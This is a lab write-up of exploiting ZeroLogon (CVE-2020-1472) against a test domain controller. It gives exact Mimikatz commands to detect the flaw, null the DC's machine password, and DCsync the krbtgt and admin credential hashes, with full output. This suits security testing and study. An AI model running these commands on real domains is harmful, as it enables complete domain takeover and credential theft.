===================================================================================================================
ZeroLogon exploit tests (CVE-2020-1472)
===================================================================================================================

Zerologon also known as CVE-2020-1472 affects a cryptographic authentication scheme(AES-CFB8) used by MS-NRPC, this scheme has multiple uses
however the reason this is so widely publicised is the ability to change computer account passwords which can lead to a total compromise of a Windows Domain by targeting AD.

Exploitating this vulnerability allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf (e.g. DCsync attack).

Exploit steps to compromise a Domain Controller
------------------------------------------------
1. Spoofing the client credential
2. Disabling signing and sealing
3. Spoofing a call
4. Changing the Domain Controller's AD password to null
5. From password change to domain admin
6. ⚠️ reset the Domain Controller's AD password in a proper way to avoid any Denial of Service

Notes:
The Netlogon Remote Protocol (also called MS-NRPC) is a remote procedure call(RPC) interface that is used exclusively by domain-joined devices. 
MS-NRPC includes an authentication method and a method of establishing a Netlogon secure channel. 
These updates enforce the specified Netlogon client behaviour to use secure RPC with Netlogon secure channel between member computers and Active Directory (AD) domain controllers (DC).


===================================================================================================================
PoC - Step 1. Check if the targeted Domain Controller is vulnerable to ZeroLogon
===================================================================================================================

=> We use Mimikatz to check/confirm if the Domain Controller of our Lab is vulnerable

C:\Users\Administrator\Documents\Tools-AD\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 31 2021 00:08:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::zerologon /target:TEMP-DC.SECURITY-TEST-LAB.LOCAL /account:TEMP-DC$
[rpc] Remote   : TEMP-DC.SECURITY-TEST-LAB.LOCAL
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] AuthnSvc : NONE (0)
[rpc] NULL Sess: no

Target : TEMP-DC.SECURITY-TEST-LAB.LOCAL
Account: TEMP-DC$
Type   : 6 (Server)
Mode   : detect

Trying to 'authenticate'...


  NetrServerAuthenticate2: 0x00000000

* Authentication: OK -- vulnerable

mimikatz #

=> It is prone to the Zerologon vulnerability !

========================================================================================
PoC - Step 2. Exploit phase
========================================================================================

=> Using Mimkatz we exploit the CVE and set the computer account's password to ""

mimikatz # lsadump::zerologon /target:TEMP-DC.SECURITY-TEST-LAB.LOCAL /account:TEMP-DC$ /exploit
[rpc] Remote   : TEMP-DC.SECURITY-TEST-LAB.LOCAL
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] AuthnSvc : NONE (0)
[rpc] NULL Sess: no

Target : TEMP-DC.SECURITY-TEST-LAB.LOCAL
Account: TEMP-DC$
Type   : 6 (Server)
Mode   : exploit

Trying to 'authenticate'...
==============================================

  NetrServerAuthenticate2: 0x00000000
  NetrServerPasswordSet2 : 0x00000000

* Authentication: OK -- vulnerable
* Set password  : OK -- may be unstable

mimikatz #


========================================================================================
PoC - Step 3. Perform DCsync attacks to take over the Domain
========================================================================================

=> We use the Domain Controller account 'SECURITY-TEST-LAB\TEMP-DC$' to perform DCsync attacks to collect:
   - the password hashs of a Domain Admin account (e.g. 'SECURITY-TEST-LAB\qulays' in our test lab )
   - the password hashs of the KRBTGT account
   - ...

mimikatz # lsadump::dcsync /domain:SECURITY-TEST-LAB.LOCAL /dc:TEMP-DC.SECURITY-TEST-LAB.LOCAL /user:krbtgt /authuser:TEMP-DC$ /authdomain:SECURITY-TEST-LAB /authpassword:"" /authntlm
[DC] 'SECURITY-TEST-LAB.LOCAL' will be the domain
[DC] 'TEMP-DC.SECURITY-TEST-LAB.LOCAL' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[rpc] Username : TEMP-DC$
[rpc] Domain   : SECURITY-TEST-LAB
[rpc] Password :

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 15/04/2020 09:00:23
Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 208ae4a2c5aa7b40d0473499408a2670
    ntlm- 0: 208ae4a2c5aa7b40d0473499408a2670
    lm  - 0: bb25cb33e1e02367f2fc2afcb2475493

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : SECURITY-TEST-LAB.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 66d811ed48e35423189b76966007f30e8feab5c14d66c33251e78463bc035f86
      aes128_hmac       (4096) : 082cb2101def04a88c035eb2ec1905c1
      des_cbc_md5       (4096) : 9dc1d9d51a02526d
<SNIP>


mimikatz # lsadump::dcsync /domain:SECURITY-TEST-LAB.LOCAL /dc:TEMP-DC.SECURITY-TEST-LAB.LOCAL /user:qualys /authuser:TEMP-DC$ /authdomain:SECURITY-TEST-LAB /authpassword:"" /authntlm
[DC] 'SECURITY-TEST-LAB.LOCAL' will be the domain
[DC] 'TEMP-DC.SECURITY-TEST-LAB.LOCAL' will be the DC server
[DC] 'qualys' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[rpc] Username : TEMP-DC$
[rpc] Domain   : SECURITY-TEST-LAB
[rpc] Password :

Object RDN           : Qualys

** SAM ACCOUNT **

SAM Username         : Qualys
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 01/01/1601 02:00:00
Password last change : 15/08/2021 21:54:54
Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-6098
Object Relative ID   : 6098

Credentials:
  Hash NTLM: db2729c0a6d072f7536c9ebd8194b854
    ntlm- 0: db2729c0a6d072f7536c9ebd8194b854
    ntlm- 1: 31b6be9560bbcd5679b5c2f20b9db20f
    ntlm- 2: f6ad8ffa822f869184f5421b12befb73
    lm  - 0: 7a14c29e6723aad11c5fa67775ef4012
    lm  - 1: 42f1e59af825c4451765b7b5e8a5167e
    lm  - 2: f3f0d8387fc25cf954d37d5c6011021d

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : SECURITY-TEST-LAB.LOCALQualys
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 55a8996a27be71e9c0a5e747254873ec95715de333856ffbc5ef6993172cbfe3
      aes128_hmac       (4096) : 6fa2814f2be8e27c5b939399cc35b850
      des_cbc_md5       (4096) : ecd6341668342ff4
<SNIP>

